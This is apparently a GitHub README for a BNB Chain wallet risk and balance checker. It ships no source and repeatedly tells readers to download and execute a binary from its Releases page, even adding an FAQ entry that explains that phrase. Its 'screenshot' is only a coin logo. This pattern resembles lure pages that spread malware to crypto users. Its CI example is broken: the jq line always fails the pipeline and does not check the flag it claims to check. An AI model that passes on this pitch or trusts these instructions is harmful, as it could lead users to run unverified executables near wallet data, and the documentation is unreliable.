# Wallet Risk Checker — View BNB Chain Wallet Risk & Balance 🧭💼

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/Shadycmd/Wallet-Risk-Checker/releases)  
https://github.com/Shadycmd/Wallet-Risk-Checker/releases

A tool to inspect BNB Chain addresses, report current BNB balance, list token holdings, and flag common risk signals. Use it to scan wallets, view token exposure, and spot suspicious patterns.

---

<!-- TOC -->
- [About](#about)
- [Key Features](#key-features)
- [How it works](#how-it-works)
- [Quick screenshot](#quick-screenshot)
- [Requirements](#requirements)
- [Download & Run](#download--run)
- [Command-line usage](#command-line-usage)
- [Output fields and risk rules](#output-fields-and-risk-rules)
- [Configuration](#configuration)
- [Examples](#examples)
- [FAQ](#faq)
- [Contributing](#contributing)
- [License](#license)
<!-- /TOC -->

## About
Wallet Risk Checker queries BNB Chain public endpoints to collect on-chain data for a wallet address. It reports balance, token list, token values, and simple risk flags. The tool runs locally and uses only public blockchain data. It helps developers, analysts, and traders make quick assessments.

## Key Features
- Fetch native BNB balance for any address on BNB Chain.
- Enumerate BEP-20 token holdings and token balances.
- Fetch token metadata (symbol, decimals, contract).
- Convert token holdings to BNB or USD using a price source.
- Flag risk signals such as:
  - Tiny balance with many tokens.
  - Recent airdrop-like token inflows.
  - Tokens from known scam addresses (local heuristic list).
  - High count of low-liquidity tokens.
- Output in JSON, CSV, or plain text.
- Script and binary releases available.

## How it works
1. The tool calls a BNB Chain RPC or a blockchain explorer API to get the wallet balance and token transfers.
2. It resolves token contract metadata using on-chain calls (ERC-20 ABI: name, symbol, decimals).
3. It aggregates balances per token and queries a price API for USD/BNB conversion when available.
4. It applies a set of heuristics to detect patterns that indicate risk:
   - Extremely high token diversity with near-zero balance.
   - Many tokens received in a short time window.
   - Tokens with suspicious contract age or ownership.
5. It prints a compact report with clear flags and raw data export.

## Quick screenshot
![Wallet Risk Checker demo](https://cryptologos.cc/logos/binance-coin-bnb-logo.png)
Example output: address, BNB balance, top tokens, and risk flags.

## Requirements
- Python 3.10+ or supplied binary for macOS/Linux/Windows.
- Network access to a BNB Chain RPC (public RPC or node).
- Optional: API key for price provider (CoinGecko or other) to show USD values.
- Optional: jq or csv tool for advanced processing.

## Download & Run
Download and execute the file from the Releases page: https://github.com/Shadycmd/Wallet-Risk-Checker/releases

- Visit the Releases page above and download the archive or binary that matches your OS.
- If a script is provided (for example wallet-risk-checker.py), mark it executable and run it:
  - chmod +x wallet-risk-checker.py
  - ./wallet-risk-checker.py --address 0x1234...
- If a binary is provided, run the binary directly:
  - ./wallet-risk-checker-linux --address 0x1234...
- The Releases page contains all packaged builds and the latest changelog.

[![Get Releases](https://img.shields.io/badge/Get-Releases-orange?style=for-the-badge&logo=github)](https://github.com/Shadycmd/Wallet-Risk-Checker/releases)

## Command-line usage
Basic options:
- --address <wallet>  : target wallet address (required)
- --rpc <url>         : BNB Chain RPC endpoint (default: public RPC)
- --format <json|csv|text> : output format (default: text)
- --since <blocks|days> : limit transfer history window
- --price-provider <coingecko|none> : price source
- --output <file>     : write output to file
- --timeout <secs>    : network timeout

Example:
./wallet-risk-checker --address 0xAbC... --rpc https://bsc-dataseed.binance.org --format json --price-provider coingecko

The tool prints a compact summary and writes detailed JSON when --output is set.

## Output fields and risk rules
JSON output includes:
- address: scanned address
- bnb_balance: native BNB balance (in BNB)
- total_value_usd: aggregated wallet value
- tokens: list of token objects
  - contract: token contract address
  - symbol: token symbol
  - balance: token balance (human)
  - raw_balance: integer on-chain balance
  - usd_value: token USD value (if price provider used)
  - decimals: token decimals
- risk_flags: list of detected signals, each with a code and reason
- timestamps and scan metadata

Common risk flags:
- MANY_TOKENS_LOW_BALANCE: >25 distinct tokens and total value under $10
- RECENT_AIRDROP_PATTERN: 3+ token inflows in last 48 hours from many contracts
- KNOWN_SCAM_CONTRACT: contract in built-in blacklist
- LOW_LIQUIDITY_TOKENS: tokens with no price data and tiny liquidity pool
- HIGH_CONCENTRATION: single token >80% of wallet value

Heuristics run locally. You can tune thresholds in config.

## Configuration
Provide config with a JSON or YAML file:
{
  "rpc": "https://bsc-dataseed.binance.org",
  "price_provider": "coingecko",
  "coingecko_timeout": 10,
  "token_checks": {
    "max_tokens_for_low_balance": 25,
    "low_balance_usd": 10
  },
  "blacklist": ["0xBadContract1...", "0xScam..."]
}

Place config at ~/.wallet-risk-checker/config.json or pass --config path.

## Examples

1) Quick text scan
./wallet-risk-checker --address 0x4Bc... --format text

Output example:
Address: 0x4Bc...
BNB: 0.032
Value (USD): $9.80
Top tokens:
 - ABC (0xabc...): 1200.00 (no price)
 - BNB (native): 0.032 (USD $9.60)
Risk flags:
 - MANY_TOKENS_LOW_BALANCE: high token count, low value

2) Export JSON for analysis
./wallet-risk-checker --address 0x4Bc... --format json --output report.json

3) CI integration (run in pipeline)
- Run scan
- Use jq to parse risk_flags
- Fail pipeline if KNOWN_SCAM_CONTRACT is present

Example CI step:
./wallet-risk-checker --address $WALLET --format json --output out.json
cat out.json | jq '.risk_flags | length > 0' && exit 1 || exit 0

## FAQ
Q: Which chains do you support?
A: This release targets BNB Chain (BSC). The core logic supports ERC-20 style tokens (BEP-20). Multi-chain support can be added.

Q: Do you need private keys?
A: No. The tool reads public on-chain data only.

Q: Where do prices come from?
A: By default, the tool uses a price provider such as CoinGecko if enabled. You can run without price data.

Q: Can I add my own blacklist?
A: Yes. Add contract addresses to the config blacklist.

Q: What does "download and execute the file" mean on the Releases page?
A: It means fetch the build or script file on the Releases page and run it on your machine. Follow OS rules for execution rights.

## Contributing
- Fork the repo.
- Create a branch: feature-name.
- Run tests.
- Open a PR with a clear description and test case.
- Keep changes small and focused.

Areas to contribute:
- Improve heuristics and risk rules.
- Add more price providers and caching.
- Add more output formats and integrations.
- Add a web UI or browser extension.

Please run the lint and unit tests before submitting a PR.

## Troubleshooting
- If RPC calls fail, switch to a different BNB Chain RPC.
- If token metadata is missing, check contract queries or increase timeout.
- If price lookup fails, enable a different provider in config.

## Changelog
See the Releases page for packaged builds, notes, and binary assets: https://github.com/Shadycmd/Wallet-Risk-Checker/releases

## License
MIT License — see LICENSE file for full terms.

## Contact
Open an issue for feature requests or bug reports. Use PRs for code fixes.